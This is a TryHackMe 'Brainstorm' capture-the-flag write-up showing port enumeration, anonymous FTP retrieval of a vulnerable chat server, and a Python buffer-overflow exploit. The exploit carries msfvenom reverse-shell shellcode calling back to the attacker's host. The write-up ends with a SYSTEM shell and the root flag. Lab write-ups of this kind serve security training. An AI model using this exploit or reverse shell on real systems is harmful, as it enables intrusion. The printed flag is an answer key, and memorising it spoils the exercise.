@@ -1,0 +1,198 @@
+---------------------------------BRAINSTORM ROOM TryHackMe-------------
+Date : 13-02-2025
+Link : https://tryhackme.com/room/brainstorm
+Difficulty : Medium
+
+
+--------------------Room enumeration
+rustscan -a 10.10.236.241 -- -A -sV -sC -O -Pn
+Open 10.10.236.241:21
+Open 10.10.236.241:3389
+Open 10.10.236.241:9999
+
+21/tcp   open  ftp            syn-ack ttl 125 Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+3389/tcp open  ms-wbt-server? syn-ack ttl 125
+9999/tcp open  abyss?         syn-ack ttl 125
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     Welcome to Brainstorm chat (beta)
+|     Please enter your username (max 20 characters): Write a message:
+|   NULL: 
+|     Welcome to Brainstorm chat (beta)
+|_    Please enter your username (max 20 characters):
+
+
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+Question1: How many ports are open?  
+Answer: 3
+
+
+--Starting with port 21 
+As anonymous logon is allowed let me connect to this and see what i can found.
+
+When we logged in we found 2 files what we download with the command mget
+
+chatserver.exe  essfunc.dll
+
+Question2: What is the name of the exe file you found?
+Answer: chatserver.exe
+
+Senario : After enumeration, you now must have noticed that the service interacting on the strange port is some how related to the files you found! Is there anyway you can exploit that strange service to gain access to the system? 
+
+It is worth using a Python script to try out different payloads to gain access! You can even use the files to locally try the exploit
+
+
+So let me show you first the application's working
+
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$ ./chatserver.exe          
+run-detectors: unable to find an interpreter for ./chatserver.exe
+                                                                                                                              
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$ python -c "print('A' * 3000)" | ./chatserver.exe 
+run-detectors: unable to find an interpreter for ./chatserver.exe
+close failed in file object destructor:
+sys.excepthook is missing
+lost sys.stderr
+                                                                                                                              
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$ python -c "print('A' * 10000)" | ./chatserver.exe
+run-detectors: unable to find an interpreter for ./chatserver.exe
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+IOError: [Errno 32] Broken pipe
+                                                                                                                              
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$ 
+
+With that we know that 3000 is too small and 10000 is too larger we will go to found the EIP offset
+
+We found something.
+
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$ python -c "print('A' * 4096)" | ./chatserver.exe
+run-detectors: unable to find an interpreter for ./chatserver.exe
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+IOError: [Errno 32] Broken pipe
+                                                                                                                              
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$ python -c "print('A' * 4095)" | ./chatserver.exe
+run-detectors: unable to find an interpreter for ./chatserver.exe
+close failed in file object destructor:
+sys.excepthook is missing
+lost sys.stderr
+                                                                                                                              
+┌──(kali㉿kali)-[~/Desktop/rooms/brainstorm]
+└─$
+
+when we put up to 4095 the system crash.
+Let us try decompilate with ghydra.
+
+
+
+After that we will create trhe payload using this command 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.127.125 LPORT=1234 EXITFUNC=thread -b "\\x00" -f py -v payload
+
+After running the command you will get your payload that you can modify in your script.
+See a prototype with my payload on it
+
+
+#-----------------------------------------------------------------------------
+import socket
+
+ip = "10.10.118.129"
+port = 9999
+
+prefix = "user"
+offset = 2012
+overflow = b"A" * offset  # Utiliser des 'bytes' au lieu de 'str'
+retn = b"\xdf\x14\x50\x62"  # Utiliser des 'bytes' au lieu de 'str'
+padding = b"\x90" * 20  # Utiliser des 'bytes' au lieu de 'str'
+
+payload =  b""
+payload += b"\xdb\xc1\xd9\x74\x24\xf4\x5d\xb8\xa3\x74\xa2"
+payload += b"\x1c\x29\xc9\xb1\x52\x31\x45\x17\x83\xed\xfc"
+payload += b"\x03\xe6\x67\x40\xe9\x14\x6f\x06\x12\xe4\x70"
+payload += b"\x67\x9a\x01\x41\xa7\xf8\x42\xf2\x17\x8a\x06"
+payload += b"\xff\xdc\xde\xb2\x74\x90\xf6\xb5\x3d\x1f\x21"
+payload += b"\xf8\xbe\x0c\x11\x9b\x3c\x4f\x46\x7b\x7c\x80"
+payload += b"\x9b\x7a\xb9\xfd\x56\x2e\x12\x89\xc5\xde\x17"
+payload += b"\xc7\xd5\x55\x6b\xc9\x5d\x8a\x3c\xe8\x4c\x1d"
+payload += b"\x36\xb3\x4e\x9c\x9b\xcf\xc6\x86\xf8\xea\x91"
+payload += b"\x3d\xca\x81\x23\x97\x02\x69\x8f\xd6\xaa\x98"
+payload += b"\xd1\x1f\x0c\x43\xa4\x69\x6e\xfe\xbf\xae\x0c"
+payload += b"\x24\x35\x34\xb6\xaf\xed\x90\x46\x63\x6b\x53"
+payload += b"\x44\xc8\xff\x3b\x49\xcf\x2c\x30\x75\x44\xd3"
+payload += b"\x96\xff\x1e\xf0\x32\x5b\xc4\x99\x63\x01\xab"
+payload += b"\xa6\x73\xea\x14\x03\xf8\x07\x40\x3e\xa3\x4f"
+payload += b"\xa5\x73\x5b\x90\xa1\x04\x28\xa2\x6e\xbf\xa6"
+payload += b"\x8e\xe7\x19\x31\xf0\xdd\xde\xad\x0f\xde\x1e"
+payload += b"\xe4\xcb\x8a\x4e\x9e\xfa\xb2\x04\x5e\x02\x67"
+payload += b"\x8a\x0e\xac\xd8\x6b\xfe\x0c\x89\x03\x14\x83"
+payload += b"\xf6\x34\x17\x49\x9f\xdf\xe2\x1a\xaa\x14\x93"
+payload += b"\xa7\xc2\x28\x6b\x5c\xc1\xa4\x8d\x36\xf5\xe0"
+payload += b"\x06\xaf\x6c\xa9\xdc\x4e\x70\x67\x99\x51\xfa"
+payload += b"\x84\x5e\x1f\x0b\xe0\x4c\xc8\xfb\xbf\x2e\x5f"
+payload += b"\x03\x6a\x46\x03\x96\xf1\x96\x4a\x8b\xad\xc1"
+payload += b"\x1b\x7d\xa4\x87\xb1\x24\x1e\xb5\x4b\xb0\x59"
+payload += b"\x7d\x90\x01\x67\x7c\x55\x3d\x43\x6e\xa3\xbe"
+payload += b"\xcf\xda\x7b\xe9\x99\xb4\x3d\x43\x68\x6e\x94"
+payload += b"\x38\x22\xe6\x61\x73\xf5\x70\x6e\x5e\x83\x9c"
+payload += b"\xdf\x37\xd2\xa3\xd0\xdf\xd2\xdc\x0c\x40\x1c"
+payload += b"\x37\x95\x60\xff\x9d\xe0\x08\xa6\x74\x49\x55"
+payload += b"\x59\xa3\x8e\x60\xda\x41\x6f\x97\xc2\x20\x6a"
+payload += b"\xd3\x44\xd9\x06\x4c\x21\xdd\xb5\x6d\x60"
+
+postfix = b""  # Assurez-vous que postfix est aussi en 'bytes'
+
+buffer = overflow + retn + padding + postfix + payload  # Tous les éléments sont maintenant en bytes
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+
+    s.connect((ip, port))
+
+    print("Sending evil buffer...")
+
+    s.send(prefix.encode() + b"\r\n")  # Utilisez .encode() pour convertir 'str' en 'bytes'
+
+    s.recv(1024)
+
+    s.send(buffer + b"\r\n")
+
+    print("Done!")
+
+except Exception as e:
+
+    print(f"Could not connect: {e}")
+    
+#---------------------------------------------------
+
+Now we launch our listner and run the script after
+
+nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.118.129 49433
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+    
+Now we just get the root flag
+  
+C:\Users\drake\Desktop>type root.txt
+type root.txt
+5b1001de5a44eca47eee71e7942a8f8a
+C:\Users\drake\Desktop>
